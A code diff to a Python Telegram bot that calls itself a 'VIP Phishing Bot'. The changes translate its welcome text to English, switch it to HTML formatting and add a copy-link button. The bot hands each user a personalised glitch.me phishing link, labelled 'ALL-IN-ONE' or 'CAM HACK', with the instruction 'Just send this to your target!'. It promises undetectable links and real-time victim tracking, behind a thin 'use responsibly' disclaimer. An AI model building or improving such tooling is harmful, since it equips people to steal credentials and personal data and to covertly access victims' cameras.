@@ -15,21 +15,22 @@ app = Client("vip_phishing_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT
 @app.on_message(filters.private & filters.command("start"))
 async def start_command(client, message):
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🛠 ALL-IN-ONE", callback_data="all_in_one"), 
+        [InlineKeyboardButton("🛠 ALL-IN-ONE", callback_data="all_in_one"),
          InlineKeyboardButton("📸 CAM HACK", callback_data="camera_hack")]
     ])
-    
-    welcome_text = (
-        "🛡 **VIP Phishing Bot mein aapka swagat hai!** 🛡\n\n"
-        "🚀 **Kuch hi seconds mein undetectable phishing links generate karein!**\n"
-        "📡 **Real-time mein victims ko track karein aur data asaani se ikattha karein.**\n\n"
-        "⚠️ **Warning:** Yeh tool sirf educational purposes ke liye hai. Kisi bhi galat istemal ki zimmedaari aapki hogi!"
+
+    welcome_text = (       
+        "🔰 <b>Welcome to the Ultimate Phishing Bot!</b> 🔰\n\n"
+        "🔥 Generate undetectable phishing links in seconds & send them to your targets!\n"
+        "🎯 Track victims in real-time & collect data effortlessly.\n\n"
+        "🛑 <b>Warning: High Security System Activated</b> 🛑\n\n"
+        "⚠️ <i>Use responsibly! Any misuse is your own responsibility.</i> ⚠️"
     )
 
     await message.reply_text(
         welcome_text,
         reply_markup=keyboard,
-        parse_mode=enums.ParseMode.MARKDOWN
+        parse_mode=enums.ParseMode.HTML
     )
 
 # 🔄 Callback Query Handler with Dynamic Loading Animation
@@ -48,24 +49,52 @@ async def callback_handler(client, callback_query):
         page_name, link = links[data]
 
         # ⏳ Send Dynamic Loading Animation
-        loading_stages = ["S", "ST", "STA", "STAR", "START", "STARTI", "STARTIN", "STARTING"]
-        loading_message = await callback_query.message.reply_text("S", parse_mode=enums.ParseMode.MARKDOWN)
+        loading_stages = [
+            "🚀 𝐒", "🚀 𝐒𝐓", "🚀 𝐒𝐓𝐀", "🚀 𝐒𝐓𝐀𝐑", "🚀 𝐒𝐓𝐀𝐑𝐓",
+            "🚀 𝐒𝐓𝐀𝐑𝐓𝐈", "🚀 𝐒𝐓𝐀𝐑𝐓𝐈𝐍", "🚀 𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆... 🔥"
+        ]
+        loading_message = await callback_query.message.reply_text("S", parse_mode=enums.ParseMode.HTML)
         
         for stage in loading_stages[1:]:
-            await asyncio.sleep(0.5)  # Adjust the delay as needed
+            await asyncio.sleep(0.1)  # Adjust the delay as needed
             await loading_message.edit_text(stage)
 
-        await asyncio.sleep(0.5)  # Short pause before deleting the loading message
+        await asyncio.sleep(0.1)  # Short pause before deleting the loading message
         await loading_message.delete()
 
-        # 📝 Send the Generated Link
-        message_text = f"🛠 **Page Name:** `{page_name}`\n" \
-                       f"🔗 **Link:** `{link}`\n\n" \
-                       f"🎯 **Usage:** Apne target ko yeh link bhejein aur data ka intezaar karein!"
-        
-        await callback_query.message.reply_text(message_text, parse_mode=enums.ParseMode.MARKDOWN)
+        # 📝 Send the Generated Link with Copy Button
+        message_text = (
+            f"🛠 <b>Page Name:</b> <code>{page_name}</code>\n"
+            f"🔗 <b>Link:</b> <code>{link}</code>\n\n"
+            f"🎯 Just send this to your target!"
+        )
+
+        copy_button = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{data}")]
+        ])
+
+        await callback_query.message.reply_text(
+            message_text, reply_markup=copy_button, parse_mode=enums.ParseMode.HTML
+        )
     else:
         await callback_query.answer("❌ Invalid selection!", show_alert=True)
+
+# 📋 Copy Link Handler
+@app.on_callback_query(filters.regex("^copy_"))
+async def copy_link_handler(client, callback_query):
+    data = callback_query.data.split("_", 1)[1]  # Extract the original callback data
+    user_id = callback_query.from_user.id
+
+    links = {
+        "all_in_one": f"https://trail-charm-waterlily.glitch.me/?id={user_id}",
+        "camera_hack": f"https://four-political-blouse.glitch.me/?id={user_id}"
+    }
+
+    if data in links:
+        link = links[data]
+        await callback_query.answer(f"📋 Copied: {link}", show_alert=True)
+    else:
+        await callback_query.answer("❌ Link not found!", show_alert=True)
 
 # 🚀 Run the Bot
 if __name__ == "__main__":
